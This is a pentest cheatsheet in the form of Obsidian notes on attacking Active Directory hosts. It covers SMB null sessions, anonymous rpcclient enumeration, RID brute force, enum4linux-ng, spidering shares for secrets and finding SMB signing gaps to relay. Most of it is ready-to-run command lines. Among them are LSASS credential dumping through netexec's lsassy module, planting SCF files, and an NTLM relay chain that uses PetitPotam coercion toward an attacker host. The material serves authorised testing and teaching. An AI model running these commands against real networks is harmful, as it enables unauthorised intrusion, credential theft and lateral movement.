---
aliases:
  - RPC Anonymous Enum
  - SMB Null Session
  - rpcclient AD
  - enum4linux-ng
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Hosts Enumeration]]"
  - "[[netexec]]"
---
# AD - Hosts Enumeration - RPC, SMB & NetBIOS Probing

***

## Anonymous SMB / Null Session

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `smbclient -L //DC -N` | Anonymous share list | Null session test. |
| `smbclient -L //DC -U "" -N` | Same explicit | Variants. |
| `smbclient //DC/SHARE -N` | Anonymous mount | Per-share. |
| `nxc smb DC -u '' -p ''` | netexec null | Quick. |
| `nxc smb DC -u '' -p '' --shares` | Anonymous shares | List. |
| `nxc smb DC -u 'guest' -p ''` | Guest account fallback | Edge. |
| `crackmapexec smb DC -u '' -p ''` | Older name | Same. |
| `nmap -p445 --script smb-enum-shares 10.0.0.0/24` | nmap script | Bulk. |
| `nmap -p445 --script smb-vuln-* DC` | Vuln scan | Adjacent. |
| Modern Server 2019+ | Null session usually disabled | Hardened. |
| Legacy Server 2008/2012 | Common null session enabled | Vuln. |
| Anonymous IPC$ access | Standard target | Always check. |
| Null session + RestrictAnonymous | Registry-controlled | Defense gap. |
| RestrictAnonymous=1 | Restrict listing | Partial defense. |
| RestrictAnonymous=2 | No anonymous access | Full defense. |
| EveryoneIncludesAnonymous=1 | Everyone includes anonymous | Misconfig. |
^ad-rpc-nullsmb

### Null session test sweep

```bash
# Quick null check
nxc smb 10.0.0.0/24 -u '' -p '' --shares

# Bulk via smbmap
smbmap -H DC -u '' -p ''
smbmap -H 10.0.0.0/24 -u '' -p ''

# Per-host smbclient
smbclient -L //DC -N
smbclient -L //10.0.0.10 -N -W WORKGROUP
```

___

## Anonymous RPC Enumeration

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `rpcclient -U "" DC -N` | Interactive shell | Null bind. |
| `rpcclient -U "%" DC` | Empty password | Variant. |
| `srvinfo` (in rpcclient) | Server info + role | Direct. |
| `enumdomains` | Domain list | Quick. |
| `lsaquery` | Domain SID + name | SID extraction. |
| `lookupsids S-1-5-21-...-500` | RID 500 = Administrator | Resolve known RID. |
| `enumdomusers` | User list (RID brute) | Common. |
| `enumdomgroups` | Group list | Adjacent. |
| `enumalsgroups domain` | Alias groups | Edge. |
| `enumalsgroups builtin` | Built-in aliases | Edge. |
| `getdompwinfo` | Password policy | Direct. |
| `querydominfo` | Domain info detailed | Adjacent. |
| `samrlookupnames domain administrator` | Resolve name → SID | Direct. |
| `samrlookuprids domain 500` | Resolve RID → name | Direct. |
| `getusrdom user` | Per-user domain info | Edge. |
| `enumtrust` | Trust list | Direct. |
^ad-rpc-anonenum

### rpcclient automation

```bash
# Multi-command in single rpcclient call
rpcclient -U "" DC -N -c '
srvinfo;
enumdomains;
lsaquery;
getdompwinfo;
enumdomusers;
enumdomgroups
'

# Or pipe commands
rpcclient -U "" DC -N <<EOF
srvinfo
lsaquery
enumdomusers
enumdomgroups
EOF
```

___

## RID Brute Force

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| netexec --rid-brute | `nxc smb DC -u u -p p --rid-brute` | Authenticated RID brute. |
| netexec null RID | `nxc smb DC -u '' -p '' --rid-brute` | If null session allowed. |
| `enum4linux -r DC` | RID range scan | Legacy. |
| `enum4linux-ng -R DC` | Modernized | Better. |
| `impacket-lookupsid` | `lookupsid.py 'dom/u:p'@DC` | Impacket. |
| `impacket-lookupsid` null | `lookupsid.py 'dom/'@DC` | Anonymous if allowed. |
| Impacket range | `lookupsid.py user:pass@DC 20000` | Iterate range. |
| Default Admin = RID 500 | First built-in admin | Standard. |
| Default Guest = RID 501 | Built-in guest | Standard. |
| krbtgt = RID 502 | KDC service account | Standard. |
| RID 1000+ | User-created accounts | Custom. |
| Domain Computers = RID 515 | Built-in group | Standard. |
| Domain Users = RID 513 | Default user group | Standard. |
| Domain Admins = RID 512 | Privileged | Standard. |
| Domain Guests = RID 514 | Built-in | Standard. |
| Group RID range | Lower than users typically | Pattern. |
^ad-rpc-ridbrute

### Bulk RID extraction

```bash
# netexec (best for AD)
nxc smb DC -u user -p pass --rid-brute 5000

# Output format:
# 500: dom\Administrator (SidTypeUser)
# 501: dom\Guest (SidTypeUser)
# 502: dom\krbtgt (SidTypeUser)
# 512: dom\Domain Admins (SidTypeGroup)
# ...

# Impacket alternative
impacket-lookupsid 'dom/user:pass'@DC 10000

# Save users only
nxc smb DC -u user -p pass --rid-brute 5000 | grep "SidTypeUser" | awk '{print $6}' | cut -d'\' -f2 > users.txt
```

___

## enum4linux-ng / Comprehensive Probes

| **Comando** | **Modo** | **Notas** |
|:---:|:---:|:---:|
| `enum4linux-ng -A DC` | Full automated | Default. |
| `enum4linux-ng -A -u user -p pass DC` | Authenticated | More info. |
| `enum4linux-ng -U DC` | Users only | Targeted. |
| `enum4linux-ng -G DC` | Groups only | Targeted. |
| `enum4linux-ng -S DC` | Shares only | Targeted. |
| `enum4linux-ng -P DC` | Password policy | Targeted. |
| `enum4linux-ng -O DC` | OS info | Banner grab. |
| `enum4linux-ng -L DC` | LDAP | Adjacent. |
| `enum4linux-ng -K DC` | Kerberos info | Adjacent. |
| `enum4linux-ng -N DC` | Named pipes | Edge. |
| `enum4linux-ng -R DC` | RID cycling | Same as RID brute. |
| `enum4linux-ng -C DC` | Computer accounts | Adjacent. |
| `enum4linux -a DC` | Legacy enum4linux | Old but works. |
| Output JSON `-oJ out.json` | Parseable | Automation. |
| Output YAML `-oY out.yaml` | Alt | Edge. |
| Verbose `-v` | Debug | Troubleshoot. |
^ad-rpc-enum4linux

### Comprehensive single-shot

```bash
# Anonymous
enum4linux-ng -A DC -oJ anon.json

# Authenticated (much more info)
enum4linux-ng -A -u user -p pass DC -oJ auth.json

# Output sections include:
# - SMB dialects
# - SMB signing requirement
# - Workgroup/domain
# - NetBIOS info
# - LSA queries (domain SID)
# - Domain password policy
# - User list
# - Group list
# - Share list
# - RID cycling results
# - Printer info
```

___

## SMB Share Spider / Content Recon

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `nxc smb hosts.txt -u u -p p --shares` | Bulk share list | Read/Write flags. |
| `nxc smb hosts.txt -u u -p p --spider <share>` | Recursive content | File enumeration. |
| `nxc smb hosts.txt -u u -p p --spider-folder . -p PASS` | Spider all readable | Recon. |
| `nxc smb hosts.txt -u u -p p -M spider_plus` | Module spider plus | Detailed. |
| `nxc smb hosts.txt -u u -p p -M slinky` | Plant SCF/desktop.ini | Active recon (intrusive). |
| `nxc smb hosts.txt -u u -p p -M lsassy` | LSASS via SMB | Cred dump. |
| `smbmap -H DC -u u -p p` | Single host detail | Read/Write/No access. |
| `smbmap -H DC -u u -p p -R` | Recurse | Spider. |
| `smbmap -H DC -u u -p p -R --depth 5` | Limited depth | Performance. |
| `smbmap -H DC -u u -p p -R -A '\.config$|\.xml$|\.ini$'` | Pattern match | Targeted. |
| `smbclient //DC/share -U u%p` | Interactive shell | Manual. |
| `manspider` | Snaffler-like — targeted | Specialized. |
| `Snaffler.exe` | Modern share-snaffler | Comprehensive. |
| Default shares | C$, ADMIN$, IPC$, NETLOGON, SYSVOL | Standard. |
| Custom shares | Investigate all | Often have data. |
| `WriteOk` shares | Write access — payload upload path | Lateral candidate. |
^ad-rpc-shares

### Share spider strategy

```bash
# Step 1: Enumerate shares across domain
nxc smb hosts.txt -u user -p pass --shares > shares.txt

# Step 2: Spider readable shares for sensitive content
nxc smb hosts.txt -u user -p pass --spider SHARE_NAME --pattern "password|secret|key" 2>&1 | tee spider.log

# Step 3: Use Snaffler for high-fidelity
.\Snaffler.exe -s -u  # remote, unattended
```

___

## SMB Signing & Relay Prep

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `nxc smb hosts.txt --signing` | Signing required vs not | Direct check. |
| `nxc smb hosts.txt --gen-relay-list relay.txt` | NTLM relay candidates | Auto-list. |
| `nmap -p445 --script smb2-security-mode hosts` | Per-host signing | nmap script. |
| `nmap -p445 --script smb-protocols hosts` | SMB versions | Adjacent. |
| Required vs Enabled | "Required" = enforced; "Enabled" = optional | Important diff. |
| Required → relay blocked | Defender wins | No relay vector. |
| Not required → relay candidate | Critical signal | Relay attack ready. |
| Default workstations | Signing required | Modern Win10/11 default. |
| Default servers | Signing required (post-2022) | Modern hardening. |
| Legacy 2008-2012 R2 | Often not required | Common vuln. |
| Pre-Windows 7 | Often not required | Critical. |
| GPO-controlled signing | Per-OU enforcement | Audit. |
| LDAP signing adjacent | Different setting | LDAP relay specific. |
| Channel binding adjacent | LDAPS extra | Defense. |
| EPA (Extended Protection) adjacent | HTTP/LDAP defense | Modern. |
| NTLM relay → SMB target | Most common path | Standard chain. |
^ad-rpc-signing

### Relay candidate workflow

```bash
# 1. List domain hosts
nxc ldap DC -u user -p pass --computers > all_hosts.txt

# 2. Identify relay candidates (signing not required)
nxc smb all_hosts.txt --signing --gen-relay-list relay_targets.txt

# 3. relay_targets.txt now has hosts that can be relayed TO
cat relay_targets.txt
# 10.0.0.10
# 10.0.0.50
# 10.0.0.100

# 4. Coercion + relay flow:
# Terminal 1: ntlmrelayx.py -tf relay_targets.txt -smb2support
# Terminal 2: PetitPotam.py -u '' -p '' attacker DC
```

***
